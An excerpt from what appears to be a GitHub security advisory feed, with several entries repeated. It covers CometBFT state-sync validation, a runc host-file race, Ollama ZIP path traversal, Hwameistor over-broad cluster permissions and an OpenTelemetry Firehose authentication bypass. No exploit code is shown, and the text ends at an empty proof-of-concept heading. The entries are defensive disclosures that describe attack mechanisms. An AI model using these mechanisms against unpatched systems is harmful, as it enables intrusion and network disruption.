        <title type="html"><![CDATA[[github.com/cometbft/cometbft/light] CometBFT's state syncing validator from malicious node may lead to a chain split]]></title>
        <id>https://github.com/advisories/GHSA-g5xx-c4hv-9ccc</id>
        <link href="https://github.com/advisories/GHSA-g5xx-c4hv-9ccc"/>
        <updated>2024-09-03T20:03:10.000Z</updated>
        <content type="html"><![CDATA[<p><strong>Name</strong>: ASA-2024-009: State syncing validator from malicious node may lead to a chain split
<strong>Component</strong>: CometBFT
<strong>Criticality</strong>: Medium (<a href="https://github.com/interchainio/security/blob/main/resources/CLASSIFICATION_MATRIX.md">ACMv1.2</a>: I:Moderate; L: Possible)
<strong>Affected versions</strong>: &gt;= 0.34.0, &lt;= 0.34.33, &gt;=0.37.0, &lt;= 0.37.10, &gt;= 0.38.0, &lt;= 0.38.11</p>
<h3 id="summary">Summary</h3>
<p>The state sync protocol retrieves a snapshot of the application and installs it in a fresh node. In order for this node to be ready to run consensus and block sync from the installed snapshot height, we also need to install a valid <code>State</code> in the node, which is the starting state from which it is able to validate new blocks and append them to the blockchain.</p>
<p>The <code>State</code> object used by state sync is computed using the light client protocol, which retrieves information about committed blocks from at least two RPC endpoints. The light client protocol performs several state validations and, in particular, compares the state provided by different RPC endpoints, looking for inconsistencies.</p>
<p>The <code>State</code> object contains, among other fields, a <code>Validators</code> field which stores the current validator set. A validator set is a list of validator addresses, public keys and associated voting powers, one per validator. It also stores, for historical reasons, the state of the proposer selection algorithm, in the form of the <code>ProposerPriority</code> field associated with each <code>Validator</code>.</p>
<p>While the light client is able to validate the <code>ValidatorSet</code> retrieved from RPC endpoints, this validation does not include the <code>ProposerPriority</code> field associated with each <code>Validator</code>. As a result, when state sync adopts RPC endpoints that, for unknown reasons, provide an invalid state of the proposer selection algorithm, the node will not be able to properly run the consensus protocol, as their local view of which validator is the proposer of a given round and height will disagree with the views of the correct validators. If an increasing number of validators state sync using RPC endpoints with invalid states, the network eventually halts.</p>
<h3 id="patches">Patches</h3>
<p>Release versions 0.34.34, 0.37.11, and 0.38.12 include a patch to address this issue.</p>
<p>In the patched versions, the light client protocol compares the <code>ProposerPriority</code> fields of the <code>ValidatorSet</code> instances retrieved from the RPC endpoints configured for state sync. If they differ, the computed <code>State</code> object is considered invalid and state sync will fail with an error.</p>
<h3 id="workarounds">Workarounds</h3>
<p>The issue is observed when validators run state sync using RPC nodes that are malicious or report invalid states for the proposer selection algorithm.</p>
<p>It is worth noting that non-malicious nodes running upstream software should never report an invalid state for the proposer selection algorithm. This situation may result from the adoption of nodes with customized code or which had their state, stored in local databases, manually updated.</p>
<p>When the network public's RPC endpoints have an invalid state for the proposer election algorithm, there, new validators should refrain from using state sync for bootstrapping or be sure that they configure for state sync RPC endpoints with a valid state of the proposer election algorithm.</p>
<p>A validator with an invalid state for the proposer selection algorithm will reject most of the proposed blocks and will have the network rejecting blocks it has proposed.  It is also possible to manually compare the state of the proposer election algorithm of nodes by comparing the outputs of the <code>/validators?height=_</code>  RPC endpoints. The outputs must fully match, including the ProposerPriority field associated with each validator. </p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://docs.cometbft.com/v0.38/core/state-sync">State Sync documentation</a></li>
</ul>
<p>This issue was reported to the Cosmos Bug Bounty Program on HackerOne on 12/08/24. If you believe you have found a bug in the Interchain Stack or would like to contribute to the program by reporting a bug, please see <a href="https://hackerone.com/cosmos">https://hackerone.com/cosmos</a>.</p>
<p>If you have questions about Interchain security efforts, please reach out to our official communication channel at <a href="mailto:security@interchain.io">security@interchain.io</a>.</p>
<p>For more information about CometBFT, please see <a href="https://docs.cometbft.com/">https://docs.cometbft.com/</a>.</p>
<p>For more information about the Interchain Foundation’s engagement with Amulet, please see <a href="https://github.com/interchainio/security">https://github.com/interchainio/security</a>.</p>
<h3 id="references-1">References</h3>
<ul>
<li><a href="https://github.com/cometbft/cometbft/security/advisories/GHSA-g5xx-c4hv-9ccc">https://github.com/cometbft/cometbft/security/advisories/GHSA-g5xx-c4hv-9ccc</a></li>
<li><a href="https://github.com/cometbft/cometbft/commit/3937e00a339ee6b861d75997b4f6c87d867b74f2">https://github.com/cometbft/cometbft/commit/3937e00a339ee6b861d75997b4f6c87d867b74f2</a></li>
<li><a href="https://github.com/cometbft/cometbft/commit/52c00a537f8f56ed94b4a5c8af6e3fecff468b55">https://github.com/cometbft/cometbft/commit/52c00a537f8f56ed94b4a5c8af6e3fecff468b55</a></li>
<li><a href="https://github.com/advisories/GHSA-g5xx-c4hv-9ccc">https://github.com/advisories/GHSA-g5xx-c4hv-9ccc</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-g5xx-c4hv-9ccc</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-09-03T20:03:08.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/cometbft/cometbft/light] CometBFT's state syncing validator from malicious node may lead to a chain split]]></title>
        <id>https://github.com/advisories/GHSA-g5xx-c4hv-9ccc</id>
        <link href="https://github.com/advisories/GHSA-g5xx-c4hv-9ccc"/>
        <updated>2024-09-03T20:03:10.000Z</updated>
        <content type="html"><![CDATA[<p><strong>Name</strong>: ASA-2024-009: State syncing validator from malicious node may lead to a chain split
<strong>Component</strong>: CometBFT
<strong>Criticality</strong>: Medium (<a href="https://github.com/interchainio/security/blob/main/resources/CLASSIFICATION_MATRIX.md">ACMv1.2</a>: I:Moderate; L: Possible)
<strong>Affected versions</strong>: &gt;= 0.34.0, &lt;= 0.34.33, &gt;=0.37.0, &lt;= 0.37.10, &gt;= 0.38.0, &lt;= 0.38.11</p>
<h3 id="summary">Summary</h3>
<p>The state sync protocol retrieves a snapshot of the application and installs it in a fresh node. In order for this node to be ready to run consensus and block sync from the installed snapshot height, we also need to install a valid <code>State</code> in the node, which is the starting state from which it is able to validate new blocks and append them to the blockchain.</p>
<p>The <code>State</code> object used by state sync is computed using the light client protocol, which retrieves information about committed blocks from at least two RPC endpoints. The light client protocol performs several state validations and, in particular, compares the state provided by different RPC endpoints, looking for inconsistencies.</p>
<p>The <code>State</code> object contains, among other fields, a <code>Validators</code> field which stores the current validator set. A validator set is a list of validator addresses, public keys and associated voting powers, one per validator. It also stores, for historical reasons, the state of the proposer selection algorithm, in the form of the <code>ProposerPriority</code> field associated with each <code>Validator</code>.</p>
<p>While the light client is able to validate the <code>ValidatorSet</code> retrieved from RPC endpoints, this validation does not include the <code>ProposerPriority</code> field associated with each <code>Validator</code>. As a result, when state sync adopts RPC endpoints that, for unknown reasons, provide an invalid state of the proposer selection algorithm, the node will not be able to properly run the consensus protocol, as their local view of which validator is the proposer of a given round and height will disagree with the views of the correct validators. If an increasing number of validators state sync using RPC endpoints with invalid states, the network eventually halts.</p>
<h3 id="patches">Patches</h3>
<p>Release versions 0.34.34, 0.37.11, and 0.38.12 include a patch to address this issue.</p>
<p>In the patched versions, the light client protocol compares the <code>ProposerPriority</code> fields of the <code>ValidatorSet</code> instances retrieved from the RPC endpoints configured for state sync. If they differ, the computed <code>State</code> object is considered invalid and state sync will fail with an error.</p>
<h3 id="workarounds">Workarounds</h3>
<p>The issue is observed when validators run state sync using RPC nodes that are malicious or report invalid states for the proposer selection algorithm.</p>
<p>It is worth noting that non-malicious nodes running upstream software should never report an invalid state for the proposer selection algorithm. This situation may result from the adoption of nodes with customized code or which had their state, stored in local databases, manually updated.</p>
<p>When the network public's RPC endpoints have an invalid state for the proposer election algorithm, there, new validators should refrain from using state sync for bootstrapping or be sure that they configure for state sync RPC endpoints with a valid state of the proposer election algorithm.</p>
<p>A validator with an invalid state for the proposer selection algorithm will reject most of the proposed blocks and will have the network rejecting blocks it has proposed.  It is also possible to manually compare the state of the proposer election algorithm of nodes by comparing the outputs of the <code>/validators?height=_</code>  RPC endpoints. The outputs must fully match, including the ProposerPriority field associated with each validator. </p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://docs.cometbft.com/v0.38/core/state-sync">State Sync documentation</a></li>
</ul>
<p>This issue was reported to the Cosmos Bug Bounty Program on HackerOne on 12/08/24. If you believe you have found a bug in the Interchain Stack or would like to contribute to the program by reporting a bug, please see <a href="https://hackerone.com/cosmos">https://hackerone.com/cosmos</a>.</p>
<p>If you have questions about Interchain security efforts, please reach out to our official communication channel at <a href="mailto:security@interchain.io">security@interchain.io</a>.</p>
<p>For more information about CometBFT, please see <a href="https://docs.cometbft.com/">https://docs.cometbft.com/</a>.</p>
<p>For more information about the Interchain Foundation’s engagement with Amulet, please see <a href="https://github.com/interchainio/security">https://github.com/interchainio/security</a>.</p>
<h3 id="references-1">References</h3>
<ul>
<li><a href="https://github.com/cometbft/cometbft/security/advisories/GHSA-g5xx-c4hv-9ccc">https://github.com/cometbft/cometbft/security/advisories/GHSA-g5xx-c4hv-9ccc</a></li>
<li><a href="https://github.com/cometbft/cometbft/commit/3937e00a339ee6b861d75997b4f6c87d867b74f2">https://github.com/cometbft/cometbft/commit/3937e00a339ee6b861d75997b4f6c87d867b74f2</a></li>
<li><a href="https://github.com/cometbft/cometbft/commit/52c00a537f8f56ed94b4a5c8af6e3fecff468b55">https://github.com/cometbft/cometbft/commit/52c00a537f8f56ed94b4a5c8af6e3fecff468b55</a></li>
<li><a href="https://github.com/advisories/GHSA-g5xx-c4hv-9ccc">https://github.com/advisories/GHSA-g5xx-c4hv-9ccc</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-g5xx-c4hv-9ccc</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-09-03T20:03:08.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/cometbft/cometbft/light] CometBFT's state syncing validator from malicious node may lead to a chain split]]></title>
        <id>https://github.com/advisories/GHSA-g5xx-c4hv-9ccc</id>
        <link href="https://github.com/advisories/GHSA-g5xx-c4hv-9ccc"/>
        <updated>2024-09-03T20:03:10.000Z</updated>
        <content type="html"><![CDATA[<p><strong>Name</strong>: ASA-2024-009: State syncing validator from malicious node may lead to a chain split
<strong>Component</strong>: CometBFT
<strong>Criticality</strong>: Medium (<a href="https://github.com/interchainio/security/blob/main/resources/CLASSIFICATION_MATRIX.md">ACMv1.2</a>: I:Moderate; L: Possible)
<strong>Affected versions</strong>: &gt;= 0.34.0, &lt;= 0.34.33, &gt;=0.37.0, &lt;= 0.37.10, &gt;= 0.38.0, &lt;= 0.38.11</p>
<h3 id="summary">Summary</h3>
<p>The state sync protocol retrieves a snapshot of the application and installs it in a fresh node. In order for this node to be ready to run consensus and block sync from the installed snapshot height, we also need to install a valid <code>State</code> in the node, which is the starting state from which it is able to validate new blocks and append them to the blockchain.</p>
<p>The <code>State</code> object used by state sync is computed using the light client protocol, which retrieves information about committed blocks from at least two RPC endpoints. The light client protocol performs several state validations and, in particular, compares the state provided by different RPC endpoints, looking for inconsistencies.</p>
<p>The <code>State</code> object contains, among other fields, a <code>Validators</code> field which stores the current validator set. A validator set is a list of validator addresses, public keys and associated voting powers, one per validator. It also stores, for historical reasons, the state of the proposer selection algorithm, in the form of the <code>ProposerPriority</code> field associated with each <code>Validator</code>.</p>
<p>While the light client is able to validate the <code>ValidatorSet</code> retrieved from RPC endpoints, this validation does not include the <code>ProposerPriority</code> field associated with each <code>Validator</code>. As a result, when state sync adopts RPC endpoints that, for unknown reasons, provide an invalid state of the proposer selection algorithm, the node will not be able to properly run the consensus protocol, as their local view of which validator is the proposer of a given round and height will disagree with the views of the correct validators. If an increasing number of validators state sync using RPC endpoints with invalid states, the network eventually halts.</p>
<h3 id="patches">Patches</h3>
<p>Release versions 0.34.34, 0.37.11, and 0.38.12 include a patch to address this issue.</p>
<p>In the patched versions, the light client protocol compares the <code>ProposerPriority</code> fields of the <code>ValidatorSet</code> instances retrieved from the RPC endpoints configured for state sync. If they differ, the computed <code>State</code> object is considered invalid and state sync will fail with an error.</p>
<h3 id="workarounds">Workarounds</h3>
<p>The issue is observed when validators run state sync using RPC nodes that are malicious or report invalid states for the proposer selection algorithm.</p>
<p>It is worth noting that non-malicious nodes running upstream software should never report an invalid state for the proposer selection algorithm. This situation may result from the adoption of nodes with customized code or which had their state, stored in local databases, manually updated.</p>
<p>When the network public's RPC endpoints have an invalid state for the proposer election algorithm, there, new validators should refrain from using state sync for bootstrapping or be sure that they configure for state sync RPC endpoints with a valid state of the proposer election algorithm.</p>
<p>A validator with an invalid state for the proposer selection algorithm will reject most of the proposed blocks and will have the network rejecting blocks it has proposed.  It is also possible to manually compare the state of the proposer election algorithm of nodes by comparing the outputs of the <code>/validators?height=_</code>  RPC endpoints. The outputs must fully match, including the ProposerPriority field associated with each validator. </p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://docs.cometbft.com/v0.38/core/state-sync">State Sync documentation</a></li>
</ul>
<p>This issue was reported to the Cosmos Bug Bounty Program on HackerOne on 12/08/24. If you believe you have found a bug in the Interchain Stack or would like to contribute to the program by reporting a bug, please see <a href="https://hackerone.com/cosmos">https://hackerone.com/cosmos</a>.</p>
<p>If you have questions about Interchain security efforts, please reach out to our official communication channel at <a href="mailto:security@interchain.io">security@interchain.io</a>.</p>
<p>For more information about CometBFT, please see <a href="https://docs.cometbft.com/">https://docs.cometbft.com/</a>.</p>
<p>For more information about the Interchain Foundation’s engagement with Amulet, please see <a href="https://github.com/interchainio/security">https://github.com/interchainio/security</a>.</p>
<h3 id="references-1">References</h3>
<ul>
<li><a href="https://github.com/cometbft/cometbft/security/advisories/GHSA-g5xx-c4hv-9ccc">https://github.com/cometbft/cometbft/security/advisories/GHSA-g5xx-c4hv-9ccc</a></li>
<li><a href="https://github.com/cometbft/cometbft/commit/3937e00a339ee6b861d75997b4f6c87d867b74f2">https://github.com/cometbft/cometbft/commit/3937e00a339ee6b861d75997b4f6c87d867b74f2</a></li>
<li><a href="https://github.com/cometbft/cometbft/commit/52c00a537f8f56ed94b4a5c8af6e3fecff468b55">https://github.com/cometbft/cometbft/commit/52c00a537f8f56ed94b4a5c8af6e3fecff468b55</a></li>
<li><a href="https://github.com/advisories/GHSA-g5xx-c4hv-9ccc">https://github.com/advisories/GHSA-g5xx-c4hv-9ccc</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-g5xx-c4hv-9ccc</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-09-03T20:03:08.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/opencontainers/runc] runc can be confused to create empty files/directories on the host]]></title>
        <id>https://github.com/advisories/GHSA-jfvp-7x6p-h2pv</id>
        <link href="https://github.com/advisories/GHSA-jfvp-7x6p-h2pv"/>
        <updated>2024-09-03T21:45:31.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>runc 1.1.13 and earlier as well as 1.2.0-rc2 and earlier can be tricked into
creating empty files or directories in arbitrary locations in the host
filesystem by sharing a volume between two containers and exploiting a race
with os.MkdirAll. While this can be used to create empty files, existing
files <strong>will not</strong> be truncated.</p>
<p>An attacker must have the ability to start containers using some kind of custom
volume configuration. Containers using user namespaces are still affected, but
the scope of places an attacker can create inodes can be significantly reduced.
Sufficiently strict LSM policies (SELinux/Apparmor) can also in principle block
this attack -- we suspect the industry standard SELinux policy may restrict
this attack's scope but the exact scope of protection hasn't been analysed.</p>
<p>This is exploitable using runc directly as well as through Docker and
Kubernetes.</p>
<p>The CVSS score for this vulnerability is
CVSS:3.1/AV:L/AC:L/PR:N/UI:R/S:C/C:N/I:L/A:N (Low severity, 3.6).</p>
<h3 id="workarounds">Workarounds</h3>
<p>Using user namespaces restricts this attack fairly significantly such that the
attacker can only create inodes in directories that the remapped root
user/group has write access to. Unless the root user is remapped to an actual
user on the host (such as with rootless containers that don't use
/etc/sub[ug]id), this in practice means that an attacker would only be able to
create inodes in world-writable directories.</p>
<p>A strict enough SELinux or AppArmor policy could in principle also restrict the
scope if a specific label is applied to the runc runtime, though we haven't
thoroughly tested to what extent the standard existing policies block this
attack nor what exact policies are needed to sufficiently restrict this attack.</p>
<h3 id="patches">Patches</h3>
<p>Fixed in runc v1.1.14 and v1.2.0-rc3.</p>
<ul>
<li><code>main</code> patches:<ul>
<li><a href="https://github.com/opencontainers/runc/pull/4359">https://github.com/opencontainers/runc/pull/4359</a></li>
<li><a href="https://github.com/opencontainers/runc/commit/63c2908164f3a1daea455bf5bcd8d363d70328c7">https://github.com/opencontainers/runc/commit/63c2908164f3a1daea455bf5bcd8d363d70328c7</a></li>
</ul>
</li>
<li><code>release-1.1</code> patches:<ul>
<li><a href="https://github.com/opencontainers/runc/commit/8781993968fd964ac723ff5f360b6f259e809a3e">https://github.com/opencontainers/runc/commit/8781993968fd964ac723ff5f360b6f259e809a3e</a></li>
<li><a href="https://github.com/opencontainers/runc/commit/f0b652ea61ff6750a8fcc69865d45a7abf37accf">https://github.com/opencontainers/runc/commit/f0b652ea61ff6750a8fcc69865d45a7abf37accf</a></li>
</ul>
</li>
</ul>
<h3 id="credits">Credits</h3>
<p>Thanks to Rodrigo Campos Catelin (@rata) and Alban Crequy (@alban) from
Microsoft for discovering and reporting this vulnerability.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/opencontainers/runc/security/advisories/GHSA-jfvp-7x6p-h2pv">https://github.com/opencontainers/runc/security/advisories/GHSA-jfvp-7x6p-h2pv</a></li>
<li><a href="https://github.com/opencontainers/runc/pull/4359">https://github.com/opencontainers/runc/pull/4359</a></li>
<li><a href="https://github.com/opencontainers/runc/commit/63c2908164f3a1daea455bf5bcd8d363d70328c7">https://github.com/opencontainers/runc/commit/63c2908164f3a1daea455bf5bcd8d363d70328c7</a></li>
<li><a href="https://github.com/opencontainers/runc/commit/8781993968fd964ac723ff5f360b6f259e809a3e">https://github.com/opencontainers/runc/commit/8781993968fd964ac723ff5f360b6f259e809a3e</a></li>
<li><a href="https://github.com/opencontainers/runc/commit/f0b652ea61ff6750a8fcc69865d45a7abf37accf">https://github.com/opencontainers/runc/commit/f0b652ea61ff6750a8fcc69865d45a7abf37accf</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-45310">https://nvd.nist.gov/vuln/detail/CVE-2024-45310</a></li>
<li><a href="https://github.com/advisories/GHSA-jfvp-7x6p-h2pv">https://github.com/advisories/GHSA-jfvp-7x6p-h2pv</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-jfvp-7x6p-h2pv</uri>
        </author>
        <category label="severity" term="LOW"/>
        <published>2024-09-03T19:49:32.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/opencontainers/runc] runc can be confused to create empty files/directories on the host]]></title>
        <id>https://github.com/advisories/GHSA-jfvp-7x6p-h2pv</id>
        <link href="https://github.com/advisories/GHSA-jfvp-7x6p-h2pv"/>
        <updated>2024-09-03T21:45:31.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>runc 1.1.13 and earlier as well as 1.2.0-rc2 and earlier can be tricked into
creating empty files or directories in arbitrary locations in the host
filesystem by sharing a volume between two containers and exploiting a race
with os.MkdirAll. While this can be used to create empty files, existing
files <strong>will not</strong> be truncated.</p>
<p>An attacker must have the ability to start containers using some kind of custom
volume configuration. Containers using user namespaces are still affected, but
the scope of places an attacker can create inodes can be significantly reduced.
Sufficiently strict LSM policies (SELinux/Apparmor) can also in principle block
this attack -- we suspect the industry standard SELinux policy may restrict
this attack's scope but the exact scope of protection hasn't been analysed.</p>
<p>This is exploitable using runc directly as well as through Docker and
Kubernetes.</p>
<p>The CVSS score for this vulnerability is
CVSS:3.1/AV:L/AC:L/PR:N/UI:R/S:C/C:N/I:L/A:N (Low severity, 3.6).</p>
<h3 id="workarounds">Workarounds</h3>
<p>Using user namespaces restricts this attack fairly significantly such that the
attacker can only create inodes in directories that the remapped root
user/group has write access to. Unless the root user is remapped to an actual
user on the host (such as with rootless containers that don't use
/etc/sub[ug]id), this in practice means that an attacker would only be able to
create inodes in world-writable directories.</p>
<p>A strict enough SELinux or AppArmor policy could in principle also restrict the
scope if a specific label is applied to the runc runtime, though we haven't
thoroughly tested to what extent the standard existing policies block this
attack nor what exact policies are needed to sufficiently restrict this attack.</p>
<h3 id="patches">Patches</h3>
<p>Fixed in runc v1.1.14 and v1.2.0-rc3.</p>
<ul>
<li><code>main</code> patches:<ul>
<li><a href="https://github.com/opencontainers/runc/pull/4359">https://github.com/opencontainers/runc/pull/4359</a></li>
<li><a href="https://github.com/opencontainers/runc/commit/63c2908164f3a1daea455bf5bcd8d363d70328c7">https://github.com/opencontainers/runc/commit/63c2908164f3a1daea455bf5bcd8d363d70328c7</a></li>
</ul>
</li>
<li><code>release-1.1</code> patches:<ul>
<li><a href="https://github.com/opencontainers/runc/commit/8781993968fd964ac723ff5f360b6f259e809a3e">https://github.com/opencontainers/runc/commit/8781993968fd964ac723ff5f360b6f259e809a3e</a></li>
<li><a href="https://github.com/opencontainers/runc/commit/f0b652ea61ff6750a8fcc69865d45a7abf37accf">https://github.com/opencontainers/runc/commit/f0b652ea61ff6750a8fcc69865d45a7abf37accf</a></li>
</ul>
</li>
</ul>
<h3 id="credits">Credits</h3>
<p>Thanks to Rodrigo Campos Catelin (@rata) and Alban Crequy (@alban) from
Microsoft for discovering and reporting this vulnerability.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/opencontainers/runc/security/advisories/GHSA-jfvp-7x6p-h2pv">https://github.com/opencontainers/runc/security/advisories/GHSA-jfvp-7x6p-h2pv</a></li>
<li><a href="https://github.com/opencontainers/runc/pull/4359">https://github.com/opencontainers/runc/pull/4359</a></li>
<li><a href="https://github.com/opencontainers/runc/commit/63c2908164f3a1daea455bf5bcd8d363d70328c7">https://github.com/opencontainers/runc/commit/63c2908164f3a1daea455bf5bcd8d363d70328c7</a></li>
<li><a href="https://github.com/opencontainers/runc/commit/8781993968fd964ac723ff5f360b6f259e809a3e">https://github.com/opencontainers/runc/commit/8781993968fd964ac723ff5f360b6f259e809a3e</a></li>
<li><a href="https://github.com/opencontainers/runc/commit/f0b652ea61ff6750a8fcc69865d45a7abf37accf">https://github.com/opencontainers/runc/commit/f0b652ea61ff6750a8fcc69865d45a7abf37accf</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-45310">https://nvd.nist.gov/vuln/detail/CVE-2024-45310</a></li>
<li><a href="https://github.com/advisories/GHSA-jfvp-7x6p-h2pv">https://github.com/advisories/GHSA-jfvp-7x6p-h2pv</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-jfvp-7x6p-h2pv</uri>
        </author>
        <category label="severity" term="LOW"/>
        <published>2024-09-03T19:49:32.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/ollama/ollama] Ollama can extract members of a ZIP archive outside of the parent directory]]></title>
        <id>https://github.com/advisories/GHSA-846m-99qv-67mg</id>
        <link href="https://github.com/advisories/GHSA-846m-99qv-67mg"/>
        <updated>2024-08-29T18:05:19.000Z</updated>
        <content type="html"><![CDATA[<p><code>extractFromZipFile</code> in <code>model.go</code> in Ollama before 0.1.47 can extract members of a ZIP archive outside of the parent directory.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-45436">https://nvd.nist.gov/vuln/detail/CVE-2024-45436</a></li>
<li><a href="https://github.com/ollama/ollama/pull/5314">https://github.com/ollama/ollama/pull/5314</a></li>
<li><a href="https://github.com/ollama/ollama/compare/v0.1.46...v0.1.47">https://github.com/ollama/ollama/compare/v0.1.46...v0.1.47</a></li>
<li><a href="https://github.com/ollama/ollama/commit/123a722a6f541e300bc8e34297ac378ebe23f527">https://github.com/ollama/ollama/commit/123a722a6f541e300bc8e34297ac378ebe23f527</a></li>
<li><a href="https://github.com/advisories/GHSA-846m-99qv-67mg">https://github.com/advisories/GHSA-846m-99qv-67mg</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-846m-99qv-67mg</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2024-08-29T03:30:49.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/hwameistor/hwameistor] Hwameistor Potential Permission Leakage of Cluster Level ]]></title>
        <id>https://github.com/advisories/GHSA-mgwr-h7mv-fh29</id>
        <link href="https://github.com/advisories/GHSA-mgwr-h7mv-fh29"/>
        <updated>2024-08-29T18:00:47.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p><em>What kind of vulnerability is it? Who is impacted?</em>
This ClusterRole has * verbs of * resources. If a malicious user can access the worker node which has hwameistor's deployment, he/she can abuse these excessive permissions to do whatever he/she likes to the whole cluster, resulting in a cluster-level privilege escalation.</p>
<h3 id="patches">Patches</h3>
<p><em>Has the problem been patched? What versions should users upgrade to?</em></p>
<blockquote>
<p>= v0.14.6</p>
</blockquote>
<h3 id="workarounds">Workarounds</h3>
<p><em>Is there a way for users to fix or remediate the vulnerability without upgrading?</em>
Update and Limit the ClusterRole using <a href="https://github.com/hwameistor/hwameistor/blob/main/helm/hwameistor/templates/clusterrole.yaml">security-role</a>.</p>
<h3 id="references">References</h3>
<p><em>Are there any links users can visit to find out more?</em>
issues:
<a href="https://github.com/hwameistor/hwameistor/issues/1457">https://github.com/hwameistor/hwameistor/issues/1457</a>
<a href="https://github.com/hwameistor/hwameistor/issues/1460">https://github.com/hwameistor/hwameistor/issues/1460</a></p>
<p>also reported by users via mails: 
<a href="https://github.com/sparkEchooo">sparkEchooo</a>, <a href="https://github.com/younaman">younaman</a></p>
<h3 id="references-1">References</h3>
<ul>
<li><a href="https://github.com/hwameistor/hwameistor/security/advisories/GHSA-mgwr-h7mv-fh29">https://github.com/hwameistor/hwameistor/security/advisories/GHSA-mgwr-h7mv-fh29</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-45054">https://nvd.nist.gov/vuln/detail/CVE-2024-45054</a></li>
<li><a href="https://github.com/hwameistor/hwameistor/issues/1457">https://github.com/hwameistor/hwameistor/issues/1457</a></li>
<li><a href="https://github.com/hwameistor/hwameistor/issues/1460">https://github.com/hwameistor/hwameistor/issues/1460</a></li>
<li><a href="https://github.com/hwameistor/hwameistor/commit/edf4cebed73cadd230bf97eab65c5311f2858450">https://github.com/hwameistor/hwameistor/commit/edf4cebed73cadd230bf97eab65c5311f2858450</a></li>
<li><a href="https://github.com/hwameistor/hwameistor/blob/main/helm/hwameistor/templates/clusterrole.yaml">https://github.com/hwameistor/hwameistor/blob/main/helm/hwameistor/templates/clusterrole.yaml</a></li>
<li><a href="https://github.com/advisories/GHSA-mgwr-h7mv-fh29">https://github.com/advisories/GHSA-mgwr-h7mv-fh29</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-mgwr-h7mv-fh29</uri>
        </author>
        <category label="severity" term="LOW"/>
        <published>2024-08-29T18:00:45.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/open-telemetry/opentelemetry-collector-contrib/receiver/awsfirehosereceiver] OpenTelemetry Collector module AWS Firehose Receiver Authentication Bypass Vulnerability]]></title>
        <id>https://github.com/advisories/GHSA-prf6-xjxh-p698</id>
        <link href="https://github.com/advisories/GHSA-prf6-xjxh-p698"/>
        <updated>2024-08-29T17:56:37.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>OpenTelemetry Collector module <a href="https://github.com/open-telemetry/opentelemetry-collector-contrib/tree/main/receiver/awsfirehosereceiver"><code>awsfirehosereceiver</code></a> allows unauthenticated remote requests, even when configured to require a key.</p>
<p>OpenTelemetry Collector can be configured to receive CloudWatch metrics via an AWS Firehose Stream. <a href="https://docs.aws.amazon.com/firehose/latest/dev/httpdeliveryrequestresponse.html">Firehose sets the header</a> <code>X-Amz-Firehose-Access-Key</code> with an arbitrary configured string. The OpenTelemetry Collector awsfirehosereceiver can optionally be configured to require this key on incoming requests. However, when this is configured it <strong>still accepts incoming requests with no key</strong>.</p>
<h3 id="impact">Impact</h3>
<p>Only OpenTelemetry Collector users configured with the “<a href="https://github.com/open-telemetry/opentelemetry-collector#alpha">alpha</a>” <code>awsfirehosereceiver</code> module are affected. This module was <a href="https://github.com/open-telemetry/opentelemetry-collector-releases/pull/74">added</a> in version v0.49.0 of the <a href="https://github.com/open-telemetry/opentelemetry-collector-releases/tree/main/distributions/otelcol-contrib">“Contrib” distribution</a> (or may be included in custom builds).</p>
<p>There is a risk of unauthorized users writing metrics. Carefully crafted metrics could hide other malicious activity. There is no risk of exfiltrating data. It’s likely these endpoints will be exposed to the public internet, as Firehose <a href="https://docs.aws.amazon.com/firehose/latest/dev/controlling-access.html#using-iam-http">does not support private HTTP endpoints</a>.</p>
<h3 id="fix">Fix</h3>
<p>A fix was introduced in <a href="https://github.com/open-telemetry/opentelemetry-collector-contrib/pull/34847">https://github.com/open-telemetry/opentelemetry-collector-contrib/pull/34847</a> and released with v0.108.0 (<a href="https://github.com/open-telemetry/opentelemetry-collector-releases/releases/tag/v0.108.0">https://github.com/open-telemetry/opentelemetry-collector-releases/releases/tag/v0.108.0</a>).</p>
<h3 id="details">Details</h3>
<details>
  <summary>Details</summary>

<h4 id="poc">PoC</h4>
